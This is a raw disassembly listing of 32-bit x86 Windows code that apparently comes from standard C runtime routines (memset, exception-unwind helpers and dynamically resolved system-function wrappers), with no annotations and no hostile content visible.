  4024dc:	e8 0a 03 00 00       	call   0x4027eb
  4024e1:	84 c0                	test   %al,%al
  4024e3:	75 07                	jne    0x4024ec
  4024e5:	e8 8b 03 00 00       	call   0x402875
  4024ea:	eb ed                	jmp    0x4024d9
  4024ec:	b0 01                	mov    $0x1,%al
  4024ee:	c3                   	ret
  4024ef:	55                   	push   %ebp
  4024f0:	8b ec                	mov    %esp,%ebp
  4024f2:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4024f6:	75 12                	jne    0x40250a
  4024f8:	e8 21 03 00 00       	call   0x40281e
  4024fd:	e8 73 03 00 00       	call   0x402875
  402502:	6a 00                	push   $0x0
  402504:	e8 ed 05 00 00       	call   0x402af6
  402509:	59                   	pop    %ecx
  40250a:	b0 01                	mov    $0x1,%al
  40250c:	5d                   	pop    %ebp
  40250d:	c3                   	ret
  40250e:	cc                   	int3
  40250f:	cc                   	int3
  402510:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402514:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  402519:	8b d7                	mov    %edi,%edx
  40251b:	8b 7c 24 04          	mov    0x4(%esp),%edi
  40251f:	85 c9                	test   %ecx,%ecx
  402521:	0f 84 3c 01 00 00    	je     0x402663
  402527:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  40252d:	83 f9 20             	cmp    $0x20,%ecx
  402530:	0f 8e df 00 00 00    	jle    0x402615
  402536:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40253c:	0f 8c 8b 00 00 00    	jl     0x4025cd
  402542:	0f ba 25 e0 3a 41 00 	btl    $0x1,0x413ae0
  402549:	01 
  40254a:	73 09                	jae    0x402555
  40254c:	f3 aa                	rep stos %al,%es:(%edi)
  40254e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402552:	8b fa                	mov    %edx,%edi
  402554:	c3                   	ret
  402555:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40255c:	01 
  40255d:	0f 83 b2 00 00 00    	jae    0x402615
  402563:	66 0f 6e c0          	movd   %eax,%xmm0
  402567:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  40256c:	03 cf                	add    %edi,%ecx
  40256e:	0f 11 07             	movups %xmm0,(%edi)
  402571:	83 c7 10             	add    $0x10,%edi
  402574:	83 e7 f0             	and    $0xfffffff0,%edi
  402577:	2b cf                	sub    %edi,%ecx
  402579:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40257f:	7e 4c                	jle    0x4025cd
  402581:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402588:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40258f:	90                   	nop
  402590:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  402594:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  402599:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  40259e:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  4025a3:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  4025a8:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  4025ad:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  4025b2:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  4025b7:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  4025bd:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  4025c3:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
  4025c9:	75 c5                	jne    0x402590
  4025cb:	eb 13                	jmp    0x4025e0
  4025cd:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  4025d4:	01 
  4025d5:	73 3e                	jae    0x402615
  4025d7:	66 0f 6e c0          	movd   %eax,%xmm0
  4025db:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  4025e0:	83 f9 20             	cmp    $0x20,%ecx
  4025e3:	72 1c                	jb     0x402601
  4025e5:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  4025e9:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  4025ee:	83 c7 20             	add    $0x20,%edi
  4025f1:	83 e9 20             	sub    $0x20,%ecx
  4025f4:	83 f9 20             	cmp    $0x20,%ecx
  4025f7:	73 ec                	jae    0x4025e5
  4025f9:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
  4025ff:	74 62                	je     0x402663
  402601:	8d 7c 39 e0          	lea    -0x20(%ecx,%edi,1),%edi
  402605:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  402609:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  40260e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402612:	8b fa                	mov    %edx,%edi
  402614:	c3                   	ret
  402615:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40261b:	74 0e                	je     0x40262b
  40261d:	88 07                	mov    %al,(%edi)
  40261f:	47                   	inc    %edi
  402620:	83 e9 01             	sub    $0x1,%ecx
  402623:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  402629:	75 f2                	jne    0x40261d
  40262b:	f7 c1 04 00 00 00    	test   $0x4,%ecx
  402631:	74 08                	je     0x40263b
  402633:	89 07                	mov    %eax,(%edi)
  402635:	83 c7 04             	add    $0x4,%edi
  402638:	83 e9 04             	sub    $0x4,%ecx
  40263b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  402641:	74 20                	je     0x402663
  402643:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40264a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402650:	89 07                	mov    %eax,(%edi)
  402652:	89 47 04             	mov    %eax,0x4(%edi)
  402655:	83 c7 08             	add    $0x8,%edi
  402658:	83 e9 08             	sub    $0x8,%ecx
  40265b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  402661:	75 ed                	jne    0x402650
  402663:	8b 44 24 04          	mov    0x4(%esp),%eax
  402667:	8b fa                	mov    %edx,%edi
  402669:	c3                   	ret
  40266a:	cc                   	int3
  40266b:	cc                   	int3
  40266c:	cc                   	int3
  40266d:	cc                   	int3
  40266e:	cc                   	int3
  40266f:	cc                   	int3
  402670:	53                   	push   %ebx
  402671:	56                   	push   %esi
  402672:	57                   	push   %edi
  402673:	8b 54 24 10          	mov    0x10(%esp),%edx
  402677:	8b 44 24 14          	mov    0x14(%esp),%eax
  40267b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40267f:	55                   	push   %ebp
  402680:	52                   	push   %edx
  402681:	50                   	push   %eax
  402682:	51                   	push   %ecx
  402683:	51                   	push   %ecx
  402684:	68 00 27 40 00       	push   $0x402700
  402689:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402690:	a1 04 30 41 00       	mov    0x413004,%eax
  402695:	33 c4                	xor    %esp,%eax
  402697:	89 44 24 08          	mov    %eax,0x8(%esp)
  40269b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4026a2:	8b 44 24 30          	mov    0x30(%esp),%eax
  4026a6:	8b 58 08             	mov    0x8(%eax),%ebx
  4026a9:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4026ad:	33 19                	xor    (%ecx),%ebx
  4026af:	8b 70 0c             	mov    0xc(%eax),%esi
  4026b2:	83 fe fe             	cmp    $0xfffffffe,%esi
  4026b5:	74 3b                	je     0x4026f2
  4026b7:	8b 54 24 34          	mov    0x34(%esp),%edx
  4026bb:	83 fa fe             	cmp    $0xfffffffe,%edx
  4026be:	74 04                	je     0x4026c4
  4026c0:	3b f2                	cmp    %edx,%esi
  4026c2:	76 2e                	jbe    0x4026f2
  4026c4:	8d 34 76             	lea    (%esi,%esi,2),%esi
  4026c7:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  4026cb:	8b 0b                	mov    (%ebx),%ecx
  4026cd:	89 48 0c             	mov    %ecx,0xc(%eax)
  4026d0:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  4026d4:	75 cc                	jne    0x4026a2
  4026d6:	68 01 01 00 00       	push   $0x101
  4026db:	8b 43 08             	mov    0x8(%ebx),%eax
  4026de:	e8 82 05 00 00       	call   0x402c65
  4026e3:	b9 01 00 00 00       	mov    $0x1,%ecx
  4026e8:	8b 43 08             	mov    0x8(%ebx),%eax
  4026eb:	e8 94 05 00 00       	call   0x402c84
  4026f0:	eb b0                	jmp    0x4026a2
  4026f2:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  4026f9:	83 c4 18             	add    $0x18,%esp
  4026fc:	5f                   	pop    %edi
  4026fd:	5e                   	pop    %esi
  4026fe:	5b                   	pop    %ebx
  4026ff:	c3                   	ret
  402700:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402704:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40270b:	b8 01 00 00 00       	mov    $0x1,%eax
  402710:	74 33                	je     0x402745
  402712:	8b 44 24 08          	mov    0x8(%esp),%eax
  402716:	8b 48 08             	mov    0x8(%eax),%ecx
  402719:	33 c8                	xor    %eax,%ecx
  40271b:	e8 a8 f0 ff ff       	call   0x4017c8
  402720:	55                   	push   %ebp
  402721:	8b 68 18             	mov    0x18(%eax),%ebp
  402724:	ff 70 0c             	push   0xc(%eax)
  402727:	ff 70 10             	push   0x10(%eax)
  40272a:	ff 70 14             	push   0x14(%eax)
  40272d:	e8 3e ff ff ff       	call   0x402670
  402732:	83 c4 0c             	add    $0xc,%esp
  402735:	5d                   	pop    %ebp
  402736:	8b 44 24 08          	mov    0x8(%esp),%eax
  40273a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40273e:	89 02                	mov    %eax,(%edx)
  402740:	b8 03 00 00 00       	mov    $0x3,%eax
  402745:	c3                   	ret
  402746:	55                   	push   %ebp
  402747:	ff 74 24 08          	push   0x8(%esp)
  40274b:	e8 7e 00 00 00       	call   0x4027ce
  402750:	83 c4 04             	add    $0x4,%esp
  402753:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402757:	8b 29                	mov    (%ecx),%ebp
  402759:	ff 71 1c             	push   0x1c(%ecx)
  40275c:	ff 71 18             	push   0x18(%ecx)
  40275f:	ff 71 28             	push   0x28(%ecx)
  402762:	e8 09 ff ff ff       	call   0x402670
  402767:	83 c4 0c             	add    $0xc,%esp
  40276a:	5d                   	pop    %ebp
  40276b:	c2 04 00             	ret    $0x4
  40276e:	55                   	push   %ebp
  40276f:	56                   	push   %esi
  402770:	57                   	push   %edi
  402771:	53                   	push   %ebx
  402772:	8b ea                	mov    %edx,%ebp
  402774:	33 c0                	xor    %eax,%eax
  402776:	33 db                	xor    %ebx,%ebx
  402778:	33 d2                	xor    %edx,%edx
  40277a:	33 f6                	xor    %esi,%esi
  40277c:	33 ff                	xor    %edi,%edi
  40277e:	ff d1                	call   *%ecx
  402780:	5b                   	pop    %ebx
  402781:	5f                   	pop    %edi
  402782:	5e                   	pop    %esi
  402783:	5d                   	pop    %ebp
  402784:	c3                   	ret
  402785:	8b ea                	mov    %edx,%ebp
  402787:	8b f1                	mov    %ecx,%esi
  402789:	8b c1                	mov    %ecx,%eax
  40278b:	6a 01                	push   $0x1
  40278d:	e8 d3 04 00 00       	call   0x402c65
  402792:	33 c0                	xor    %eax,%eax
  402794:	33 db                	xor    %ebx,%ebx
  402796:	33 c9                	xor    %ecx,%ecx
  402798:	33 d2                	xor    %edx,%edx
  40279a:	33 ff                	xor    %edi,%edi
  40279c:	ff e6                	jmp    *%esi
  40279e:	55                   	push   %ebp
  40279f:	8b ec                	mov    %esp,%ebp
  4027a1:	53                   	push   %ebx
  4027a2:	56                   	push   %esi
  4027a3:	57                   	push   %edi
  4027a4:	6a 00                	push   $0x0
  4027a6:	52                   	push   %edx
  4027a7:	68 b2 27 40 00       	push   $0x4027b2
  4027ac:	51                   	push   %ecx
  4027ad:	e8 00 81 00 00       	call   0x40a8b2
  4027b2:	5f                   	pop    %edi
  4027b3:	5e                   	pop    %esi
  4027b4:	5b                   	pop    %ebx
  4027b5:	5d                   	pop    %ebp
  4027b6:	c3                   	ret
  4027b7:	55                   	push   %ebp
  4027b8:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  4027bc:	52                   	push   %edx
  4027bd:	51                   	push   %ecx
  4027be:	ff 74 24 14          	push   0x14(%esp)
  4027c2:	e8 a9 fe ff ff       	call   0x402670
  4027c7:	83 c4 0c             	add    $0xc,%esp
  4027ca:	5d                   	pop    %ebp
  4027cb:	c2 08 00             	ret    $0x8
  4027ce:	c3                   	ret
  4027cf:	55                   	push   %ebp
  4027d0:	8b ec                	mov    %esp,%ebp
  4027d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4027d5:	85 c0                	test   %eax,%eax
  4027d7:	74 0e                	je     0x4027e7
  4027d9:	3d e4 3a 41 00       	cmp    $0x413ae4,%eax
  4027de:	74 07                	je     0x4027e7
  4027e0:	50                   	push   %eax
  4027e1:	e8 27 16 00 00       	call   0x403e0d
  4027e6:	59                   	pop    %ecx
  4027e7:	5d                   	pop    %ebp
  4027e8:	c2 04 00             	ret    $0x4
  4027eb:	68 cf 27 40 00       	push   $0x4027cf
  4027f0:	e8 d0 01 00 00       	call   0x4029c5
  4027f5:	a3 20 30 41 00       	mov    %eax,0x413020
  4027fa:	59                   	pop    %ecx
  4027fb:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027fe:	75 03                	jne    0x402803
  402800:	32 c0                	xor    %al,%al
  402802:	c3                   	ret
  402803:	68 e4 3a 41 00       	push   $0x413ae4
  402808:	50                   	push   %eax
  402809:	e8 2b 02 00 00       	call   0x402a39
  40280e:	59                   	pop    %ecx
  40280f:	59                   	pop    %ecx
  402810:	85 c0                	test   %eax,%eax
  402812:	75 07                	jne    0x40281b
  402814:	e8 05 00 00 00       	call   0x40281e
  402819:	eb e5                	jmp    0x402800
  40281b:	b0 01                	mov    $0x1,%al
  40281d:	c3                   	ret
  40281e:	a1 20 30 41 00       	mov    0x413020,%eax
  402823:	83 f8 ff             	cmp    $0xffffffff,%eax
  402826:	74 0e                	je     0x402836
  402828:	50                   	push   %eax
  402829:	e8 d1 01 00 00       	call   0x4029ff
  40282e:	83 0d 20 30 41 00 ff 	orl    $0xffffffff,0x413020
  402835:	59                   	pop    %ecx
  402836:	b0 01                	mov    $0x1,%al
  402838:	c3                   	ret
  402839:	56                   	push   %esi
  40283a:	57                   	push   %edi
  40283b:	bf 0c 3b 41 00       	mov    $0x413b0c,%edi
  402840:	33 f6                	xor    %esi,%esi
  402842:	6a 00                	push   $0x0
  402844:	68 a0 0f 00 00       	push   $0xfa0
  402849:	57                   	push   %edi
  40284a:	e8 27 02 00 00       	call   0x402a76
  40284f:	83 c4 0c             	add    $0xc,%esp
  402852:	85 c0                	test   %eax,%eax
  402854:	74 15                	je     0x40286b
  402856:	ff 05 24 3b 41 00    	incl   0x413b24
  40285c:	83 c6 18             	add    $0x18,%esi
  40285f:	83 c7 18             	add    $0x18,%edi
  402862:	83 fe 18             	cmp    $0x18,%esi
  402865:	72 db                	jb     0x402842
  402867:	b0 01                	mov    $0x1,%al
  402869:	eb 07                	jmp    0x402872
  40286b:	e8 05 00 00 00       	call   0x402875
  402870:	32 c0                	xor    %al,%al
  402872:	5f                   	pop    %edi
  402873:	5e                   	pop    %esi
  402874:	c3                   	ret
  402875:	56                   	push   %esi
  402876:	8b 35 24 3b 41 00    	mov    0x413b24,%esi
  40287c:	85 f6                	test   %esi,%esi
  40287e:	74 20                	je     0x4028a0
  402880:	6b c6 18             	imul   $0x18,%esi,%eax
  402883:	57                   	push   %edi
  402884:	8d b8 f4 3a 41 00    	lea    0x413af4(%eax),%edi
  40288a:	57                   	push   %edi
  40288b:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  402891:	ff 0d 24 3b 41 00    	decl   0x413b24
  402897:	83 ef 18             	sub    $0x18,%edi
  40289a:	83 ee 01             	sub    $0x1,%esi
  40289d:	75 eb                	jne    0x40288a
  40289f:	5f                   	pop    %edi
  4028a0:	b0 01                	mov    $0x1,%al
  4028a2:	5e                   	pop    %esi
  4028a3:	c3                   	ret
  4028a4:	55                   	push   %ebp
  4028a5:	8b ec                	mov    %esp,%ebp
  4028a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4028aa:	33 c9                	xor    %ecx,%ecx
  4028ac:	53                   	push   %ebx
  4028ad:	56                   	push   %esi
  4028ae:	57                   	push   %edi
  4028af:	8d 1c 85 38 3b 41 00 	lea    0x413b38(,%eax,4),%ebx
  4028b6:	33 c0                	xor    %eax,%eax
  4028b8:	f0 0f b1 0b          	lock cmpxchg %ecx,(%ebx)
  4028bc:	8b 15 04 30 41 00    	mov    0x413004,%edx
  4028c2:	83 cf ff             	or     $0xffffffff,%edi
  4028c5:	8b ca                	mov    %edx,%ecx
  4028c7:	8b f2                	mov    %edx,%esi
  4028c9:	83 e1 1f             	and    $0x1f,%ecx
  4028cc:	33 f0                	xor    %eax,%esi
  4028ce:	d3 ce                	ror    %cl,%esi
  4028d0:	3b f7                	cmp    %edi,%esi
  4028d2:	74 69                	je     0x40293d
  4028d4:	85 f6                	test   %esi,%esi
  4028d6:	74 04                	je     0x4028dc
  4028d8:	8b c6                	mov    %esi,%eax
  4028da:	eb 63                	jmp    0x40293f
  4028dc:	8b 75 10             	mov    0x10(%ebp),%esi
  4028df:	3b 75 14             	cmp    0x14(%ebp),%esi
  4028e2:	74 1a                	je     0x4028fe
  4028e4:	ff 36                	push   (%esi)
  4028e6:	e8 59 00 00 00       	call   0x402944
  4028eb:	59                   	pop    %ecx
  4028ec:	85 c0                	test   %eax,%eax
  4028ee:	75 2f                	jne    0x40291f
  4028f0:	83 c6 04             	add    $0x4,%esi
  4028f3:	3b 75 14             	cmp    0x14(%ebp),%esi
  4028f6:	75 ec                	jne    0x4028e4
  4028f8:	8b 15 04 30 41 00    	mov    0x413004,%edx
  4028fe:	33 c0                	xor    %eax,%eax
  402900:	85 c0                	test   %eax,%eax
  402902:	74 29                	je     0x40292d
  402904:	ff 75 0c             	push   0xc(%ebp)
  402907:	50                   	push   %eax
  402908:	ff 15 d4 c0 40 00    	call   *0x40c0d4
  40290e:	8b f0                	mov    %eax,%esi
  402910:	85 f6                	test   %esi,%esi
  402912:	74 13                	je     0x402927
  402914:	56                   	push   %esi
  402915:	e8 12 f2 ff ff       	call   0x401b2c
  40291a:	59                   	pop    %ecx
  40291b:	87 03                	xchg   %eax,(%ebx)
  40291d:	eb b9                	jmp    0x4028d8
  40291f:	8b 15 04 30 41 00    	mov    0x413004,%edx
  402925:	eb d9                	jmp    0x402900
  402927:	8b 15 04 30 41 00    	mov    0x413004,%edx
  40292d:	8b c2                	mov    %edx,%eax
  40292f:	6a 20                	push   $0x20
  402931:	83 e0 1f             	and    $0x1f,%eax
  402934:	59                   	pop    %ecx
  402935:	2b c8                	sub    %eax,%ecx
  402937:	d3 cf                	ror    %cl,%edi
  402939:	33 fa                	xor    %edx,%edi
  40293b:	87 3b                	xchg   %edi,(%ebx)
  40293d:	33 c0                	xor    %eax,%eax
  40293f:	5f                   	pop    %edi
  402940:	5e                   	pop    %esi
  402941:	5b                   	pop    %ebx
  402942:	5d                   	pop    %ebp
  402943:	c3                   	ret
  402944:	55                   	push   %ebp
  402945:	8b ec                	mov    %esp,%ebp
  402947:	53                   	push   %ebx
  402948:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40294b:	33 c9                	xor    %ecx,%ecx
  40294d:	57                   	push   %edi
  40294e:	33 c0                	xor    %eax,%eax
  402950:	8d 3c 9d 28 3b 41 00 	lea    0x413b28(,%ebx,4),%edi
  402957:	f0 0f b1 0f          	lock cmpxchg %ecx,(%edi)
  40295b:	8b c8                	mov    %eax,%ecx
  40295d:	85 c9                	test   %ecx,%ecx
  40295f:	74 0b                	je     0x40296c
  402961:	8d 41 01             	lea    0x1(%ecx),%eax
  402964:	f7 d8                	neg    %eax
  402966:	1b c0                	sbb    %eax,%eax
  402968:	23 c1                	and    %ecx,%eax
  40296a:	eb 55                	jmp    0x4029c1
  40296c:	8b 1c 9d b8 c1 40 00 	mov    0x40c1b8(,%ebx,4),%ebx
  402973:	56                   	push   %esi
  402974:	68 00 08 00 00       	push   $0x800
  402979:	6a 00                	push   $0x0
  40297b:	53                   	push   %ebx
  40297c:	ff 15 d8 c0 40 00    	call   *0x40c0d8
  402982:	8b f0                	mov    %eax,%esi
  402984:	85 f6                	test   %esi,%esi
  402986:	75 27                	jne    0x4029af
  402988:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  40298e:	83 f8 57             	cmp    $0x57,%eax
  402991:	75 0d                	jne    0x4029a0
  402993:	56                   	push   %esi
  402994:	56                   	push   %esi
  402995:	53                   	push   %ebx
  402996:	ff 15 d8 c0 40 00    	call   *0x40c0d8
  40299c:	8b f0                	mov    %eax,%esi
  40299e:	eb 02                	jmp    0x4029a2
  4029a0:	33 f6                	xor    %esi,%esi
  4029a2:	85 f6                	test   %esi,%esi
  4029a4:	75 09                	jne    0x4029af
  4029a6:	83 c8 ff             	or     $0xffffffff,%eax
  4029a9:	87 07                	xchg   %eax,(%edi)
  4029ab:	33 c0                	xor    %eax,%eax
  4029ad:	eb 11                	jmp    0x4029c0
  4029af:	8b c6                	mov    %esi,%eax
  4029b1:	87 07                	xchg   %eax,(%edi)
  4029b3:	85 c0                	test   %eax,%eax
  4029b5:	74 07                	je     0x4029be
  4029b7:	56                   	push   %esi
  4029b8:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  4029be:	8b c6                	mov    %esi,%eax
  4029c0:	5e                   	pop    %esi
  4029c1:	5f                   	pop    %edi
  4029c2:	5b                   	pop    %ebx
  4029c3:	5d                   	pop    %ebp
  4029c4:	c3                   	ret
  4029c5:	55                   	push   %ebp
  4029c6:	8b ec                	mov    %esp,%ebp
  4029c8:	56                   	push   %esi
  4029c9:	68 70 c2 40 00       	push   $0x40c270
  4029ce:	68 68 c2 40 00       	push   $0x40c268
  4029d3:	68 70 c2 40 00       	push   $0x40c270
  4029d8:	6a 04                	push   $0x4
  4029da:	e8 c5 fe ff ff       	call   0x4028a4
  4029df:	8b f0                	mov    %eax,%esi
  4029e1:	83 c4 10             	add    $0x10,%esp
  4029e4:	85 f6                	test   %esi,%esi
  4029e6:	74 0f                	je     0x4029f7
  4029e8:	ff 75 08             	push   0x8(%ebp)
  4029eb:	8b ce                	mov    %esi,%ecx
  4029ed:	e8 14 f7 ff ff       	call   0x402106
  4029f2:	ff d6                	call   *%esi
  4029f4:	5e                   	pop    %esi
  4029f5:	5d                   	pop    %ebp
  4029f6:	c3                   	ret
  4029f7:	5e                   	pop    %esi
  4029f8:	5d                   	pop    %ebp
  4029f9:	ff 25 c0 c0 40 00    	jmp    *0x40c0c0
  4029ff:	55                   	push   %ebp
  402a00:	8b ec                	mov    %esp,%ebp
  402a02:	56                   	push   %esi
  402a03:	68 84 c2 40 00       	push   $0x40c284
  402a08:	68 7c c2 40 00       	push   $0x40c27c
  402a0d:	68 84 c2 40 00       	push   $0x40c284
  402a12:	6a 05                	push   $0x5
  402a14:	e8 8b fe ff ff       	call   0x4028a4
  402a19:	83 c4 10             	add    $0x10,%esp
  402a1c:	8b f0                	mov    %eax,%esi
  402a1e:	ff 75 08             	push   0x8(%ebp)
  402a21:	85 f6                	test   %esi,%esi
  402a23:	74 0b                	je     0x402a30
  402a25:	8b ce                	mov    %esi,%ecx
  402a27:	e8 da f6 ff ff       	call   0x402106
  402a2c:	ff d6                	call   *%esi
  402a2e:	eb 06                	jmp    0x402a36
  402a30:	ff 15 cc c0 40 00    	call   *0x40c0cc
  402a36:	5e                   	pop    %esi
  402a37:	5d                   	pop    %ebp
  402a38:	c3                   	ret
  402a39:	55                   	push   %ebp
  402a3a:	8b ec                	mov    %esp,%ebp
  402a3c:	56                   	push   %esi
  402a3d:	68 a0 c2 40 00       	push   $0x40c2a0
  402a42:	68 98 c2 40 00       	push   $0x40c298
  402a47:	68 a0 c2 40 00       	push   $0x40c2a0
  402a4c:	6a 07                	push   $0x7
  402a4e:	e8 51 fe ff ff       	call   0x4028a4
  402a53:	83 c4 10             	add    $0x10,%esp
  402a56:	8b f0                	mov    %eax,%esi
  402a58:	ff 75 0c             	push   0xc(%ebp)
  402a5b:	ff 75 08             	push   0x8(%ebp)
  402a5e:	85 f6                	test   %esi,%esi
  402a60:	74 0b                	je     0x402a6d
  402a62:	8b ce                	mov    %esi,%ecx
  402a64:	e8 9d f6 ff ff       	call   0x402106
  402a69:	ff d6                	call   *%esi
  402a6b:	eb 06                	jmp    0x402a73
  402a6d:	ff 15 c8 c0 40 00    	call   *0x40c0c8
  402a73:	5e                   	pop    %esi
  402a74:	5d                   	pop    %ebp
  402a75:	c3                   	ret
  402a76:	55                   	push   %ebp
  402a77:	8b ec                	mov    %esp,%ebp
  402a79:	56                   	push   %esi
  402a7a:	68 b4 c2 40 00       	push   $0x40c2b4
  402a7f:	68 ac c2 40 00       	push   $0x40c2ac
  402a84:	68 b4 c2 40 00       	push   $0x40c2b4
  402a89:	6a 08                	push   $0x8
  402a8b:	e8 14 fe ff ff       	call   0x4028a4
  402a90:	8b f0                	mov    %eax,%esi
  402a92:	83 c4 10             	add    $0x10,%esp
  402a95:	85 f6                	test   %esi,%esi
  402a97:	74 14                	je     0x402aad
  402a99:	ff 75 10             	push   0x10(%ebp)
  402a9c:	8b ce                	mov    %esi,%ecx
  402a9e:	ff 75 0c             	push   0xc(%ebp)
  402aa1:	ff 75 08             	push   0x8(%ebp)
  402aa4:	e8 5d f6 ff ff       	call   0x402106
  402aa9:	ff d6                	call   *%esi
  402aab:	eb 0c                	jmp    0x402ab9
  402aad:	ff 75 0c             	push   0xc(%ebp)
  402ab0:	ff 75 08             	push   0x8(%ebp)
  402ab3:	ff 15 bc c0 40 00    	call   *0x40c0bc
  402ab9:	5e                   	pop    %esi
  402aba:	5d                   	pop    %ebp
  402abb:	c3                   	ret
  402abc:	a1 04 30 41 00       	mov    0x413004,%eax
  402ac1:	ba 5c 3b 41 00       	mov    $0x413b5c,%edx
  402ac6:	56                   	push   %esi
  402ac7:	83 e0 1f             	and    $0x1f,%eax
  402aca:	33 f6                	xor    %esi,%esi
  402acc:	6a 20                	push   $0x20
  402ace:	59                   	pop    %ecx
  402acf:	2b c8                	sub    %eax,%ecx
  402ad1:	b8 38 3b 41 00       	mov    $0x413b38,%eax
  402ad6:	d3 ce                	ror    %cl,%esi
  402ad8:	33 c9                	xor    %ecx,%ecx
  402ada:	33 35 04 30 41 00    	xor    0x413004,%esi
  402ae0:	3b d0                	cmp    %eax,%edx
  402ae2:	1b d2                	sbb    %edx,%edx
  402ae4:	83 e2 f7             	and    $0xfffffff7,%edx
  402ae7:	83 c2 09             	add    $0x9,%edx
  402aea:	41                   	inc    %ecx
  402aeb:	89 30                	mov    %esi,(%eax)
  402aed:	8d 40 04             	lea    0x4(%eax),%eax
  402af0:	3b ca                	cmp    %edx,%ecx
  402af2:	75 f6                	jne    0x402aea
  402af4:	5e                   	pop    %esi
  402af5:	c3                   	ret
  402af6:	55                   	push   %ebp
  402af7:	8b ec                	mov    %esp,%ebp
  402af9:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  402afd:	75 27                	jne    0x402b26
  402aff:	56                   	push   %esi
  402b00:	be 28 3b 41 00       	mov    $0x413b28,%esi
  402b05:	83 3e 00             	cmpl   $0x0,(%esi)
  402b08:	74 10                	je     0x402b1a
  402b0a:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  402b0d:	74 08                	je     0x402b17
  402b0f:	ff 36                	push   (%esi)
  402b11:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  402b17:	83 26 00             	andl   $0x0,(%esi)
  402b1a:	83 c6 04             	add    $0x4,%esi
  402b1d:	81 fe 38 3b 41 00    	cmp    $0x413b38,%esi
  402b23:	75 e0                	jne    0x402b05
  402b25:	5e                   	pop    %esi
  402b26:	5d                   	pop    %ebp
  402b27:	c3                   	ret
  402b28:	a1 04 30 41 00       	mov    0x413004,%eax
  402b2d:	83 e0 1f             	and    $0x1f,%eax
  402b30:	6a 20                	push   $0x20
  402b32:	59                   	pop    %ecx
  402b33:	2b c8                	sub    %eax,%ecx
  402b35:	33 c0                	xor    %eax,%eax
  402b37:	d3 c8                	ror    %cl,%eax
  402b39:	33 05 04 30 41 00    	xor    0x413004,%eax
  402b3f:	a3 5c 3b 41 00       	mov    %eax,0x413b5c
  402b44:	c3                   	ret
  402b45:	cc                   	int3
  402b46:	cc                   	int3
  402b47:	cc                   	int3
  402b48:	cc                   	int3
  402b49:	cc                   	int3
  402b4a:	cc                   	int3
  402b4b:	cc                   	int3
  402b4c:	cc                   	int3
  402b4d:	cc                   	int3
  402b4e:	cc                   	int3
  402b4f:	cc                   	int3
  402b50:	55                   	push   %ebp
  402b51:	8b ec                	mov    %esp,%ebp
  402b53:	53                   	push   %ebx
  402b54:	56                   	push   %esi
  402b55:	57                   	push   %edi
  402b56:	55                   	push   %ebp
  402b57:	6a 00                	push   $0x0
  402b59:	6a 00                	push   $0x0
  402b5b:	68 68 2b 40 00       	push   $0x402b68
  402b60:	ff 75 08             	push   0x8(%ebp)
  402b63:	e8 4a 7d 00 00       	call   0x40a8b2
  402b68:	5d                   	pop    %ebp
  402b69:	5f                   	pop    %edi
  402b6a:	5e                   	pop    %esi
  402b6b:	5b                   	pop    %ebx
  402b6c:	8b e5                	mov    %ebp,%esp
  402b6e:	5d                   	pop    %ebp
  402b6f:	c3                   	ret
  402b70:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402b74:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
